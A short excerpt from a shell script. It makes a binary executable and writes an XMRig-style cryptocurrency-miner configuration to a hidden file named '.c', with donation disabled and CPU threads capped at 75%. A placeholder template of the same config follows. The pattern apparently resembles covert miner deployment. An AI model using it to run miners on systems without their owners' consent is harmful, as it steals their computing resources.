...
chmod +x "$W1/$BN"
printf '{"autosave":true,"watch":false,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"%s","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$POOL" "$W" "$P">"$W1/.c"
chmod 600 "$W1/.c"
...
CFG='{"autosave":true,"watch":false,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"POOLURL","user":"WALLETHERE","pass":"PASSHERE","keepalive":true,"tls":true}]}'
